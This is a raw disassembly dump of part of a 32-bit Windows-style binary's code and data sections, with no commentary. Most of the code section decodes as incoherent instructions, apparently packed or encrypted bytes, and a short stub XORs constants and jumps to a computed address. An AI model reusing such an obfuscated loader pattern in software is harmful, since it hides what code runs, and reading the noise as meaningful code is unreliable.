  41281d:	sub    ah,BYTE PTR [ecx+0x16ac1556]
  412823:	test   eax,0x9d50a21e
  412828:	xor    dl,BYTE PTR [ebp+0x17f3afbd]
  41282e:	call   0x5c40:0x80de2e8
  412835:	lds    esp,FWORD PTR [edx*2-0x5cecdfd6]
  41283c:	inc    edx
  41283d:	adc    eax,0xfd42838a
  412842:	ret    
  412843:	in     al,0xca
  412845:	aam    0x3e
  412847:	test   al,0xad
  412849:	and    bl,cl
  41284b:	not    BYTE PTR [edi]
  41284d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41284e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41284f:	pop    es
  412850:	or     DWORD PTR [ebx],ebx
  412852:	sbb    al,0xcc
  412854:	jecxz  0x4128c1
  412856:	xchg   edx,eax
  412857:	mov    DWORD PTR [eax+0x21],ebp
  41285a:	sbb    al,0xee
  41285c:	mov    BYTE PTR [ebx],0xdd
  41285f:	shr    DWORD PTR [ebx],0x7
  412862:	popa   
  412863:	addr16 jge 0x412873
  412866:	aaa    
  412867:	mov    dh,0xd6
  412869:	ror    BYTE PTR [eax+eax*2+0x44a3270a],0x3
  412871:	retf   0x411c
  412874:	(bad)  [ecx+ebp*4+0x7e]
  412878:	lods   eax,DWORD PTR ds:[esi]
  412879:	xor    edi,esp
  41287b:	lods   eax,DWORD PTR ds:[esi]
  41287c:	shr    BYTE PTR [edx-0x3d],1
  41287f:	adc    al,BYTE PTR [eax-0x78]
  412882:	gs jb  0x41280b
  412885:	add    BYTE PTR [eax],0x51
  412888:	pop    ebp
  412889:	clc    
  41288a:	test   bh,ch
  41288c:	sbb    BYTE PTR [ecx+ecx*1+0x695f8ba2],cl
  412893:	pop    esp
  412894:	and    al,0x25
  412896:	cs dec edx
  412898:	xchg   edi,eax
  412899:	movhps xmm3,QWORD PTR [edx+0x9]
  41289d:	adc    BYTE PTR [edi],dl
  41289f:	inc    eax
  4128a0:	and    bl,0x4f
  4128a3:	gs addr16 sbb ebx,edx
  4128a7:	and    DWORD PTR [ebx-0xf],esp
  4128aa:	add    ebp,ebx
  4128ac:	sub    bl,bh
  4128ae:	lods   eax,DWORD PTR ds:[esi]
  4128af:	data16 lock lods al,BYTE PTR ds:[esi]
  4128b2:	xor    al,0x97
  4128b4:	fwait
  4128b5:	and    DWORD PTR [edi+0x6e],esp
  4128b8:	in     al,0x54
  4128ba:	js     0x41291e
  4128bc:	sar    DWORD PTR [eax],cl
  4128be:	push   ss
  4128bf:	fistp  WORD PTR [edi-0x71629cfe]
  4128c5:	dec    edi
  4128c6:	xchg   edx,eax
  4128c7:	daa    
  4128c8:	pop    edx
  4128c9:	jmp    0xece9588e
  4128ce:	adc    ecx,DWORD PTR [ebx+eax*8]
  4128d1:	pushf  
  4128d2:	lods   al,BYTE PTR ds:[esi]
  4128d3:	ds jbe 0x41285a
  4128d6:	int    0xe
  4128d8:	and    al,0x5e
  4128da:	inc    dl
  4128dc:	hlt    
  4128dd:	stos   DWORD PTR es:[edi],eax
  4128de:	hlt    
  4128df:	fdiv   DWORD PTR [esi+0x27]
  4128e2:	sti    
  4128e3:	cld    
  4128e4:	out    dx,eax
  4128e5:	sahf   
  4128e6:	dec    eax
  4128e7:	inc    ecx
  4128e8:	mov    edx,0x5e59c92e
  4128ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4128ef:	call   0xe48128e9
  4128f4:	xchg   esp,eax
  4128f5:	aad    0xd
  4128f7:	lods   al,BYTE PTR ds:[esi]
  4128f8:	sbb    ecx,DWORD PTR [ebx+edx*1-0x2b]
  4128fc:	adc    DWORD PTR es:0x6e285178,ebx
  412903:	scas   al,BYTE PTR es:[edi]
  412904:	sar    BYTE PTR [ebx+0x21b6c767],cl
  41290a:	jbe    0x4128e4
  41290c:	inc    esp
  41290d:	ins    DWORD PTR es:[edi],dx
  41290e:	inc    ebp
  41290f:	ins    BYTE PTR es:[edi],dx
  412910:	push   ss
  412911:	cld    
  412912:	jecxz  0x412992
  412914:	in     al,dx
  412915:	and    al,BYTE PTR [edi]
  412917:	cwde   
  412918:	(bad)  
  412919:	sbb    eax,0x40e35e40
  41291e:	and    eax,0xffffffa3
  412921:	ins    DWORD PTR es:[edi],dx
  412922:	adc    dl,al
  412924:	cli    
  412925:	gs jmp 0x4128ea
  412928:	inc    esp
  412929:	xchg   ebx,ecx
  41292b:	sub    BYTE PTR [edi-0x13],al
  41292e:	xor    DWORD PTR [eax+esi*1],ebx
  412931:	aas    
  412932:	push   edi
  412933:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412934:	mov    bl,0x71
  412936:	sbb    edx,0x36391187
  41293c:	lods   eax,DWORD PTR ds:[esi]
  41293d:	jnp    0x41292b
  41293f:	xchg   ecx,eax
  412940:	ret    0xd548
  412943:	push   ebx
  412944:	int3   
  412945:	ss mov edx,0xfeee035c
  41294b:	call   0x14fa:0xf2d78a55
  412952:	or     edi,edi
  412954:	pop    ebx
  412955:	pusha  
  412956:	js     0x4128df
  412958:	setae  BYTE PTR [edi-0x2f2603c5]
  41295f:	retf   
  412960:	sbb    BYTE PTR [ecx+0x3c],bl
  412963:	daa    
  412964:	pop    esi
  412965:	lea    esp,[esi+esi*1-0x593552a2]
  41296c:	and    cl,BYTE PTR [ecx+ecx*8-0x4f]
  412970:	pushf  
  412971:	fiadd  WORD PTR [ebp-0x44]
  412974:	xor    dl,al
  412976:	add    BYTE PTR [edi],bl
  412978:	in     al,dx
  412979:	xor    DWORD PTR [edx+0x419f4eb2],ebx
  41297f:	ds rcl dh,cl
  412982:	push   0x14caff2f
  412987:	dec    esp
  412988:	daa    
  412989:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41298a:	and    al,0x5b
  41298c:	xor    BYTE PTR [esi+edi*8+0x3],0xc6
  412991:	imul   eax,DWORD PTR [edx]
  412994:	mov    edx,DWORD PTR [ebp-0x4]
  412997:	xor    edx,ecx
  412999:	mov    ecx,DWORD PTR [ebp+0x8]
  41299c:	lea    ecx,[edx+ecx*1+0x327299]
  4129a3:	cmp    ecx,eax
  4129a5:	jne    0x412541
  4129ab:	mov    ebx,esi
  4129ad:	jmp    0x4129b7
  4129b2:	mov    ebx,0x327299
  4129b7:	mov    eax,DWORD PTR [ebp-0x4]
  4129ba:	xor    eax,0x7510851
  4129bf:	add    eax,ebx
  4129c1:	mov    DWORD PTR [ebp-0xc],eax
  4129c4:	xor    ebx,ebx
  4129c6:	lea    eax,[ebp-0x10]
  4129c9:	add    ebx,DWORD PTR [eax]
  4129cb:	call   ebx
  4129cd:	xor    ebx,ebx
  4129cf:	inc    ebx
  4129d0:	cmp    DWORD PTR [ebp+0x10],ebx
  4129d3:	je     0x412bf1
  4129d9:	xchg   edx,eax
  4129da:	push   0xa
  4129dc:	pop    ecx
  4129dd:	jmp    0x412bdd
  4129e2:	jmp    0x757c:0x13b47be7
  4129e9:	popa   
  4129ea:	cmc    
  4129eb:	xchg   dh,dl
  4129ed:	fmul   DWORD PTR ds:0xa72ff4b8
  4129f3:	pop    ecx
  4129f4:	jle    0x412a74
  4129f6:	pop    ecx
  4129f7:	jg     0x412a77
  4129f9:	jle    0x412a67
  4129fb:	(bad)  
  4129fd:	jl     0x4129e8
  4129ff:	test   BYTE PTR [ecx],al
  412a01:	in     al,dx
  412a02:	bound  ecx,QWORD PTR [edi]
  412a04:	jl     0x4129bd
  412a06:	scas   eax,DWORD PTR es:[edi]
  412a07:	jo     0x4129d8
  412a09:	sbb    cl,BYTE PTR ds:[ebx]
  412a0c:	mov    fs,WORD PTR [esi]
  412a0e:	mov    cl,BYTE PTR ds:0xcd7cdbe4
  412a14:	mov    esi,DWORD PTR [ecx-0x51]
  412a17:	push   edx
  412a18:	jno    0x412a16
  412a1a:	out    0x11,al
  412a1c:	lds    ebp,FWORD PTR [eax-0x64b61b8a]
  412a22:	lahf   
  412a23:	pop    ebx
  412a24:	adc    ecx,esi
  412a26:	add    BYTE PTR [eax+eiz*8-0x2b],bh
  412a2a:	push   esp
  412a2b:	repnz xchg ecx,eax
  412a2d:	sbb    esi,DWORD PTR [edi-0x501f15f3]
  412a33:	xchg   ebx,eax
  412a34:	lahf   
  412a35:	push   eax
  412a36:	cmc    
  412a37:	mov    eax,ds:0xa3714128
  412a3c:	cmc    
  412a3d:	mov    edx,0x561029ad
  412a42:	ja     0x412a15
  412a44:	pop    ebx
  412a45:	ins    DWORD PTR es:[edi],dx
  412a46:	and    dh,cl
  412a48:	inc    esi
  412a49:	mov    al,0xfb
  412a4b:	(bad)  [ebx-0x28]
  412a4e:	ret    
  412a4f:	ins    BYTE PTR es:[edi],dx
  412a50:	cmp    BYTE PTR [eax-0x7e],dl
  412a53:	dec    esi
  412a54:	iret   
  412a55:	mov    ds:0xec272633,eax
  412a5a:	loope  0x412ab9
  412a5c:	push   ecx
  412a5d:	cwde   
  412a5e:	aaa    
  412a5f:	cmp    bl,BYTE PTR [edx-0xa]
  412a62:	mov    ds:0xe1f695f,al
  412a67:	xchg   ebp,eax
  412a68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a69:	ret    0x6d25
  412a6c:	(bad)
  412a71:	push   cs
  412a72:	scas   al,BYTE PTR es:[edi]
  412a73:	or     al,0xb4
  412a75:	mov    cl,0xae
  412a77:	mov    ch,0x8d
  412a79:	ss cmc 
  412a7b:	push   ebx
  412a7c:	out    dx,ax
  412a7e:	xchg   edx,eax
  412a7f:	adc    dh,bl
  412a81:	add    eax,0x221d9761
  412a86:	scas   al,BYTE PTR es:[edi]
  412a87:	xchg   edx,eax
  412a88:	popf   
  412a89:	lds    ecx,FWORD PTR [ecx+edx*4]
  412a8c:	add    eax,DWORD PTR [ecx+0x3effe112]
  412a92:	add    eax,0x45c480cc
  412a97:	push   ss
  412a98:	fistp  WORD PTR [ebx]
  412a9a:	cld    
  412a9b:	sbb    DWORD PTR [edi],eax
  412a9d:	arpl   WORD PTR [edx+0x5c],bp
  412aa0:	xchg   edx,eax
  412aa1:	jle    0x412a47
  412aa3:	sti    
  412aa4:	sub    bl,BYTE PTR [eax-0x705e390a]
  412aaa:	outs   dx,BYTE PTR ds:[esi]
  412aab:	jo     0x412abb
  412aad:	xor    dl,BYTE PTR [esi+0x3a28ae33]
  412ab3:	mov    al,ds:0x53d667f5
  412ab8:	call   0x258f5b60
  412abd:	stos   DWORD PTR es:[edi],eax
  412abe:	cmp    edx,eax
  412ac0:	pop    esi
  412ac1:	ret    
  412ac2:	rcr    BYTE PTR [eax],0x40
  412ac5:	retf   0xdd41
  412ac8:	add    dh,BYTE PTR [edx-0x7ba6989e]
  412ace:	(bad)  [ebp-0x1b]
  412ad1:	push   edx
  412ad2:	sbb    BYTE PTR ds:0xc54ddb71,al
  412ad8:	retf   0xf68e
  412adb:	mov    eax,ds:0xece288da
  412ae0:	clc    
  412ae1:	js     0x412ae4
  412ae3:	cdq    
  412ae4:	add    bh,al
  412ae6:	mov    ah,BYTE PTR [ecx+0x5b]
  412ae9:	(bad)  
  412aea:	add    al,0x6
  412aec:	inc    ebx
  412aed:	fiadd  DWORD PTR [eax-0x80]
  412af0:	aam    0xa9
  412af2:	mov    cl,0xf0
  412af4:	mov    esi,0x6ea64868
  412af9:	sub    BYTE PTR [ebx-0x25c43edc],0xa4
  412b00:	enter  0x1c61,0xb9
  412b04:	mov    dl,0x4c
  412b06:	mov    bh,0xf7
  412b08:	sti    
  412b09:	aaa    
  412b0a:	cmp    al,0xf5
  412b0c:	xchg   BYTE PTR [eax],dl
  412b0e:	or     al,0x74
  412b10:	jmp    0x412adc
  412b12:	fcmovu st,st(0)
  412b14:	push   ebx
  412b15:	dec    esp
  412b16:	mov    edi,0x27317ca0
  412b1b:	call   0x4a04:0xf10c34eb
  412b22:	cmp    BYTE PTR ds:0xd7c35a55,0x4a
  412b29:	xchg   cl,cl
  412b2b:	sar    dh,cl
  412b2d:	pop    ebx
  412b2e:	add    ecx,DWORD PTR [edx+0x382ac2fb]
  412b34:	adc    eax,DWORD PTR [esp+ebp*4+0x7f]
  412b38:	mov    dh,0xcf
  412b3a:	repz imul esp,DWORD PTR cs:[ecx-0xf032d49],0x1695fb6
  412b46:	push   ebx
  412b47:	aaa    
  412b48:	add    esi,DWORD PTR [esi+0x73]
  412b4b:	jb     0x412b9a
  412b4d:	mov    al,0x60
  412b4f:	mov    ecx,0xbfbc0a79
  412b54:	in     eax,dx
  412b55:	rcl    BYTE PTR [edi],0xf2
  412b58:	push   edx
  412b59:	or     al,0xbd
  412b5b:	in     eax,dx
  412b5c:	outs   dx,BYTE PTR ds:[esi]
  412b5d:	dec    esi
  412b5e:	jae    0x412bd8
  412b60:	inc    ecx
  412b61:	inc    esp
  412b62:	ficomp DWORD PTR [ecx-0x7e194476]
  412b68:	push   ecx
  412b69:	pop    edi
  412b6a:	push   cs
  412b6b:	jl     0x412bcc
  412b6d:	or     ebp,DWORD PTR [edx-0x11]
  412b70:	sub    BYTE PTR [esi+0x79],0x3a
  412b74:	cwde   
  412b75:	or     DWORD PTR [esi-0x3c],ecx
  412b78:	scas   eax,DWORD PTR es:[edi]
  412b79:	mov    BYTE PTR [edx-0x34],dl
  412b7c:	push   esp
  412b7d:	xchg   DWORD PTR fs:[edx+0x2],esi
  412b81:	sar    DWORD PTR [ecx],1
  412b83:	push   0x6d5b1b9
  412b88:	mov    ah,0x8c
  412b8a:	dec    ecx
  412b8b:	outs   dx,BYTE PTR ds:[esi]
  412b8c:	xchg   ecx,eax
  412b8d:	scas   eax,DWORD PTR es:[edi]
  412b8e:	jl     0x412b28
  412b90:	adc    dl,BYTE PTR [edx-0x2ec3c890]
  412b96:	xor    bl,bh
  412b98:	and    ecx,DWORD PTR [edi]
  412b9a:	dec    eax
  412b9b:	xchg   ebx,eax
  412b9c:	mov    ebp,0x842f0752
  412ba1:	or     dh,bl
  412ba3:	adc    ebp,edi
  412ba5:	out    dx,al
  412ba6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ba7:	icebp  
  412ba8:	loopne 0x412bee
  412baa:	or     bh,BYTE PTR [ebx]
  412bac:	fs jbe 0x412b3f
  412baf:	cmp    DWORD PTR [ecx+0xd],ebp
  412bb2:	fistp  QWORD PTR [ebp+0x69]
  412bb5:	test   eax,0x9b6ca3a5
  412bba:	aam    0x2c
  412bbc:	fnsave [esi+0x2b]
  412bbf:	imul   ecx,DWORD PTR [esi],0xffffffa4
  412bc2:	xor    cl,BYTE PTR [edi]
  412bc4:	xchg   DWORD PTR [edx-0x15f9e3f],edx
  412bca:	retf   0xa455
  412bcd:	pop    ebx
  412bce:	mov    BYTE PTR [edx+ebx*8+0x1f544734],cl
  412bd5:	mov    ecx,0x10cc4009
  412bda:	test   BYTE PTR [eax+0x5b046af8],dh
  412be0:	inc    ebx
  412be1:	xchg   ebx,ecx
  412be3:	sub    ebx,ecx
  412be5:	xchg   ebx,ecx
  412be7:	dec    ecx
  412be8:	mov    eax,DWORD PTR [ebp-0x1c]
  412beb:	imul   eax,ecx
  412bee:	add    esp,eax
  412bf0:	xchg   edx,eax
  412bf1:	push   eax
  412bf2:	xor    ebx,ebx
  412bf4:	mov    edx,esp
  412bf6:	dec    edx
  412bf7:	inc    ebx
  412bf8:	add    ebx,DWORD PTR [edx+ebx*1]
  412bfb:	dec    ebx
  412bfc:	xor    edx,edx
  412bfe:	add    DWORD PTR [ebp-0xc],ebx
  412c01:	pop    ebx
  412c02:	mov    eax,DWORD PTR [ebp-0xc]
  412c05:	pop    edi
  412c06:	pop    esi
  412c07:	pop    ebx
  412c08:	leave  
  412c09:	ret    0x10

Disassembly of section .data:

00413000 <.data>:
  413000:	xor    al,0x39
  413002:	add    DWORD PTR [eax],eax
  413004:	inc    edx
  413005:	cmp    DWORD PTR [ecx],eax
  413007:	add    BYTE PTR [ecx+edi*1+0x1],cl
  41300b:	add    BYTE PTR [ecx+edi*1+0x1],dl
  41300f:	add    BYTE PTR [esi+0x39],bl
  413012:	add    DWORD PTR [eax],eax
  413014:	push   0x39
  413016:	add    DWORD PTR [eax],eax
  413018:	jl     0x413053
  41301a:	add    DWORD PTR [eax],eax
  41301c:	xchg   BYTE PTR [ecx],bh
  41301e:	add    DWORD PTR [eax],eax
  413020:	xchg   esp,eax
  413021:	cmp    DWORD PTR [ecx],eax
  413023:	add    BYTE PTR [ecx+edi*1+0x39a80001],bl
  41302a:	add    DWORD PTR [eax],eax
  41302c:	mov    ah,0x39
  41302e:	add    DWORD PTR [eax],eax
  413030:	les    edi,FWORD PTR [ecx]
  413032:	add    DWORD PTR [eax],eax
  413034:	into   
  413035:	cmp    DWORD PTR [ecx],eax
  413037:	add    dh,dl
  413039:	cmp    DWORD PTR [ecx],eax
  41303b:	add    dl,ah
  41303d:	cmp    DWORD PTR [ecx],eax
  41303f:	add    dl,ch
  413041:	cmp    DWORD PTR [ecx],eax
  413043:	add    ah,dh
  413045:	cmp    DWORD PTR [ecx],eax
  413047:	add    ah,bh
  413049:	cmp    DWORD PTR [ecx],eax
  41304b:	add    BYTE PTR [eax],cl
  41304d:	cmp    al,BYTE PTR [ecx]
  41304f:	add    BYTE PTR [edx],dl
  413051:	cmp    al,BYTE PTR [ecx]
  413053:	add    BYTE PTR [edx],bl
  413055:	cmp    al,BYTE PTR [ecx]
  413057:	add    BYTE PTR [edx+edi*1],ah
  41305a:	add    DWORD PTR [eax],eax
  41305c:	xor    BYTE PTR [edx],bh
  41305e:	add    DWORD PTR [eax],eax
  413060:	cmp    bh,BYTE PTR [edx]
  413062:	add    DWORD PTR [eax],eax
  413064:	dec    eax
  413065:	cmp    al,BYTE PTR [ecx]
  413067:	add    BYTE PTR [edx+0x3a],dl
  41306a:	add    DWORD PTR [eax],eax
  41306c:	pop    esi
  41306d:	cmp    al,BYTE PTR [ecx]
  41306f:	add    BYTE PTR [edx+edi*1+0x1],ch
  413073:	add    BYTE PTR [edx+0x3a],bh
  413076:	add    DWORD PTR [eax],eax
  413078:	test   BYTE PTR [edx],bh
  41307a:	add    DWORD PTR [eax],eax
  41307c:	mov    ?,WORD PTR [edx]
  41307e:	add    DWORD PTR [eax],eax
  413080:	cwde   
  413081:	cmp    al,BYTE PTR [ecx]
  413083:	add    BYTE PTR [edx-0x55fffec6],ah
  413089:	cmp    al,BYTE PTR [ecx]
  41308b:	add    BYTE PTR [edx+edi*1+0x3abe0001],dh
  413092:	add    DWORD PTR [eax],eax
  413094:	enter  0x13a,0x0
  413098:	fdivr  QWORD PTR [edx]
  41309a:	add    DWORD PTR [eax],eax
  41309c:	out    0x3a,al
  41309e:	add    DWORD PTR [eax],eax
  4130a0:	repnz cmp al,BYTE PTR [ecx]
  4130a3:	add    dh,bh
  4130a5:	cmp    al,BYTE PTR [ecx]
  4130a7:	add    BYTE PTR [eax],cl
  4130a9:	cmp    eax,DWORD PTR [ecx]
  4130ab:	add    BYTE PTR [eax],bl
  4130ad:	cmp    eax,DWORD PTR [ecx]
  4130af:	add    BYTE PTR [eax],al
  4130b1:	add    BYTE PTR [eax],al
  4130b3:	add    BYTE PTR [esi],ch
  4130b5:	cmp    eax,DWORD PTR [ecx]
  4130b7:	add    BYTE PTR [edx+0x3b],al
  4130ba:	add    DWORD PTR [eax],eax
  4130bc:	pop    eax
  4130bd:	cmp    eax,DWORD PTR [ecx]
  4130bf:	add    BYTE PTR [eax+0x3b],ch
  4130c2:	add    DWORD PTR [eax],eax
  4130c4:	je     0x413101
  4130c6:	add    DWORD PTR [eax],eax
  4130c8:	nop
  4130c9:	cmp    eax,DWORD PTR [ecx]
  4130cb:	add    BYTE PTR [ebx+edi*1+0x3bb40001],bl
  4130d2:	add    DWORD PTR [eax],eax
  4130d4:	int3   
  4130d5:	cmp    eax,DWORD PTR [ecx]
  4130d7:	add    dl,bl
  4130d9:	cmp    eax,DWORD PTR [ecx]
  4130db:	add    dh,ah
  4130dd:	cmp    eax,DWORD PTR [ecx]
  4130df:	add    al,bh
  4130e1:	cmp    eax,DWORD PTR [ecx]
  4130e3:	add    BYTE PTR [esp+edi*1],cl
  4130e6:	add    DWORD PTR [eax],eax
  4130e8:	sbb    bh,BYTE PTR [ecx+eax*1]
  4130eb:	add    BYTE PTR [edx],ch
  4130ed:	cmp    al,0x1
  4130ef:	add    BYTE PTR [edx],bh
  4130f1:	cmp    al,0x1
  4130f3:	add    BYTE PTR [esi+0x3c],cl
  4130f6:	add    DWORD PTR [eax],eax
  4130f8:	pop    edx
  4130f9:	cmp    al,0x1
  4130fb:	add    BYTE PTR [edx+0x3c],ch
  4130fe:	add    DWORD PTR [eax],eax
  413100:	js     0x41313e
  413102:	add    DWORD PTR [eax],eax
  413104:	xchg   edx,eax
  413105:	cmp    al,0x1
  413107:	add    BYTE PTR [esp+edi*1+0x3cb20001],ah
  41310e:	add    DWORD PTR [eax],eax
  413110:	ret    0x13c
  413113:	add    ah,dl
  413115:	cmp    al,0x1
  413117:	add    dh,ah
  413119:	cmp    al,0x1
  41311b:	add    ah,dh
  41311d:	cmp    al,0x1
  41311f:	add    dh,bh
  413121:	cmp    al,0x1
  413123:	add    BYTE PTR [esi],cl
  413125:	cmp    eax,0x3d1e0001
  41312a:	add    DWORD PTR [eax],eax
  41312c:	sub    al,0x3d
  41312e:	add    DWORD PTR [eax],eax
  413130:	cmp    bh,BYTE PTR ds:0x3d4c0001
  413136:	add    DWORD PTR [eax],eax
  413138:	pop    eax
  413139:	cmp    eax,0x3d6e0001
  41313e:	add    DWORD PTR [eax],eax
  413140:	cmp    BYTE PTR ds:0x3d920001,0x1
  413147:	add    BYTE PTR [esi-0x45fffec3],ah
  41314d:	cmp    eax,0x3dce0001
  413152:	add    DWORD PTR [eax],eax
  413154:	jmp    0x13d:0xf800013d
  41315b:	add    BYTE PTR [esi],al
  41315d:	add    DWORD PTR ds:[eax],eax
  413160:	sbb    al,0x3e
  413162:	add    DWORD PTR [eax],eax
  413164:	sub    bh,BYTE PTR [esi]
  413166:	add    DWORD PTR [eax],eax
  413168:	cmp    al,0x3e
  41316a:	add    DWORD PTR [eax],eax
  41316c:	dec    eax
  41316d:	add    DWORD PTR ds:[eax],eax
  413170:	pop    esp
  413171:	add    DWORD PTR ds:[eax],eax
  413174:	ins    BYTE PTR es:[edi],dx
  413175:	add    DWORD PTR ds:[eax],eax
  413178:	jl     0x4131b8
  41317a:	add    DWORD PTR [eax],eax
  41317c:	mov    BYTE PTR [esi],bh
  41317e:	add    DWORD PTR [eax],eax
  413180:	cwde   
  413181:	add    DWORD PTR ds:[eax],eax
  413184:	lods   al,BYTE PTR ds:[esi]
  413185:	add    DWORD PTR ds:[eax],eax
  413188:	mov    edx,0xcc00013e
  41318d:	add    DWORD PTR ds:[eax],eax
  413190:	fidivr DWORD PTR [esi]
  413192:	add    DWORD PTR [eax],eax
  413194:	lock add DWORD PTR ds:[eax],eax
  413198:	(bad)  
  413199:	add    DWORD PTR ds:[eax],eax
  41319c:	push   cs
  41319d:	aas    
  41319e:	add    DWORD PTR [eax],eax
  4131a0:	sbb    bh,BYTE PTR [edi]
  4131a2:	add    DWORD PTR [eax],eax
  4131a4:	sub    bh,BYTE PTR [edi]
  4131a6:	add    DWORD PTR [eax],eax
  4131a8:	cmp    BYTE PTR [edi],bh
  4131aa:	add    DWORD PTR [eax],eax
  4131ac:	dec    esi
  4131ad:	aas    
  4131ae:	add    DWORD PTR [eax],eax
  4131b0:	bound  edi,QWORD PTR [edi]
  4131b2:	add    DWORD PTR [eax],eax
  4131b4:	outs   dx,BYTE PTR ds:[esi]
  4131b5:	aas    
  4131b6:	add    DWORD PTR [eax],eax
  4131b8:	js     0x4131f9
  4131ba:	add    DWORD PTR [eax],eax
  4131bc:	xchg   BYTE PTR [edi],bh
  4131be:	add    DWORD PTR [eax],eax
  4131c0:	xchg   esp,eax
  4131c1:	aas    
  4131c2:	add    DWORD PTR [eax],eax
  4131c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4131c5:	aas    
  4131c6:	add    DWORD PTR [eax],eax
  4131c8:	mov    dh,0x3f
  4131ca:	add    DWORD PTR [eax],eax
  4131cc:	enter  0x13f,0x0
  4131d0:	fidivr DWORD PTR [edi]
  4131d2:	add    DWORD PTR [eax],eax
  4131d4:	in     al,dx
  4131d5:	aas    
  4131d6:	add    DWORD PTR [eax],eax
  4131d8:	clc    
  4131d9:	aas    
  4131da:	add    DWORD PTR [eax],eax
  4131dc:	or     al,BYTE PTR [eax+0x1]
  4131df:	add    BYTE PTR [edx],ah
  4131e1:	inc    eax
  4131e2:	add    DWORD PTR [eax],eax
  4131e4:	xor    al,0x40
  4131e6:	add    DWORD PTR [eax],eax
  4131e8:	dec    eax
  4131e9:	inc    eax
  4131ea:	add    DWORD PTR [eax],eax
  4131ec:	pop    edx
  4131ed:	inc    eax
  4131ee:	add    DWORD PTR [eax],eax
  4131f0:	fs inc eax
  4131f2:	add    DWORD PTR [eax],eax
  4131f4:	je     0x413236
  4131f6:	add    DWORD PTR [eax],eax
  4131f8:	add    BYTE PTR [eax+0x1],0x0
  4131fc:	cwde   
  4131fd:	inc    eax
  4131fe:	add    DWORD PTR [eax],eax
  413200:	lods   al,BYTE PTR ds:[esi]
  413201:	inc    eax
  413202:	add    DWORD PTR [eax],eax
  413204:	mov    esp,0xca000140
  413209:	inc    eax
  41320a:	add    DWORD PTR [eax],eax
  41320c:	loopne 0x41324e
  41320e:	add    DWORD PTR [eax],eax
  413210:	lock inc eax
  413212:	add    DWORD PTR [eax],eax
  413214:	or     BYTE PTR [ecx+0x1],al
  413217:	add    BYTE PTR [esi],dl
  413219:	inc    ecx
  41321a:	add    DWORD PTR [eax],eax
  41321c:	sub    BYTE PTR [ecx+0x1],al
  41321f:	add    BYTE PTR [esi],dh
  413221:	inc    ecx
  413222:	add    DWORD PTR [eax],eax
  413224:	inc    esp
  413225:	inc    ecx
  413226:	add    DWORD PTR [eax],eax
  413228:	push   edx
  413229:	inc    ecx
  41322a:	add    DWORD PTR [eax],eax
  41322c:	pusha  
  41322d:	inc    ecx
  41322e:	add    DWORD PTR [eax],eax
  413230:	jo     0x413273
  413232:	add    DWORD PTR [eax],eax
  413234:	test   BYTE PTR [ecx+0x1],al
  413237:	add    BYTE PTR [edx-0x5ffffebf],dl
  41323d:	inc    ecx
  41323e:	add    DWORD PTR [eax],eax
  413240:	scas   al,BYTE PTR es:[edi]
  413241:	inc    ecx
  413242:	add    DWORD PTR [eax],eax
  413244:	mov    esi,0xd6000141
  413249:	inc    ecx
  41324a:	add    DWORD PTR [eax],eax
  41324c:	call   0xfa413392
  413251:	inc    ecx
  413252:	add    DWORD PTR [eax],eax
  413254:	push   es
  413255:	inc    edx
  413256:	add    DWORD PTR [eax],eax
  413258:	sbb    BYTE PTR [edx+0x1],al
  41325b:	add    BYTE PTR [esi],ch
  41325d:	inc    edx
  41325e:	add    DWORD PTR [eax],eax
  413260:	cmp    al,BYTE PTR [edx+0x1]
  413263:	add    BYTE PTR [esi+0x42],cl
  413266:	add    DWORD PTR [eax],eax
  413268:	pusha  
  413269:	inc    edx
  41326a:	add    DWORD PTR [eax],eax
  41326c:	add    BYTE PTR [eax],al
  41326e:	add    BYTE PTR [eax],al
  413270:	add    BYTE PTR [edx+0x1],0x0
  413274:	cwde   
  413275:	inc    edx
  413276:	add    DWORD PTR [eax],eax
  413278:	scas   al,BYTE PTR es:[edi]
  413279:	inc    edx
  41327a:	add    DWORD PTR [eax],eax
  41327c:	mov    edx,0xca000142
  413281:	inc    edx
  413282:	add    DWORD PTR [eax],eax
  413284:	fadd   QWORD PTR [edx+0x1]
  413287:	add    ah,ch
  413289:	inc    edx
  41328a:	add    DWORD PTR [eax],eax
  41328c:	clc    
  41328d:	inc    edx
  41328e:	add    DWORD PTR [eax],eax
  413290:	push   cs
  413291:	inc    ebx
  413292:	add    DWORD PTR [eax],eax
  413294:	sbb    BYTE PTR [ebx+0x1],al
  413297:	add    BYTE PTR [ebx+eax*2],ah
  41329a:	add    DWORD PTR [eax],eax
  41329c:	xor    al,BYTE PTR [ebx+0x1]
  41329f:	add    BYTE PTR [edx+0x43],al
  4132a2:	add    DWORD PTR [eax],eax
  4132a4:	push   eax
  4132a5:	inc    ebx
  4132a6:	add    DWORD PTR [eax],eax
  4132a8:	pop    edx
  4132a9:	inc    ebx
  4132aa:	add    DWORD PTR [eax],eax
  4132ac:	outs   dx,BYTE PTR ds:[esi]
  4132ad:	inc    ebx
  4132ae:	add    DWORD PTR [eax],eax
  4132b0:	test   BYTE PTR [ebx+0x1],al
  4132b3:	add    BYTE PTR [ebx+eax*2+0x43a40001],dl
  4132ba:	add    DWORD PTR [eax],eax
  4132bc:	mov    eax,0xcc000143
  4132c1:	inc    ebx
  4132c2:	add    DWORD PTR [eax],eax
  4132c4:	fiadd  DWORD PTR [ebx+0x1]
  4132c7:	add    dl,ch
  4132c9:	inc    ebx
  4132ca:	add    DWORD PTR [eax],eax
  4132cc:	clc    
  4132cd:	inc    ebx
  4132ce:	add    DWORD PTR [eax],eax
  4132d0:	or     BYTE PTR [ecx+eax*1+0x0],al
  4132d4:	adc    al,0x44
  4132d6:	add    DWORD PTR [eax],eax
  4132d8:	and    BYTE PTR [ecx+eax*1+0x0],al
  4132dc:	xor    al,0x44
  4132de:	add    DWORD PTR [eax],eax
  4132e0:	inc    esi
  4132e1:	inc    esp
  4132e2:	add    DWORD PTR [eax],eax
  4132e4:	pop    edx
  4132e5:	inc    esp
  4132e6:	add    DWORD PTR [eax],eax
  4132e8:	inc    sp
  4132ea:	add    DWORD PTR [eax],eax
  4132ec:	jbe    0x413332
  4132ee:	add    DWORD PTR [eax],eax
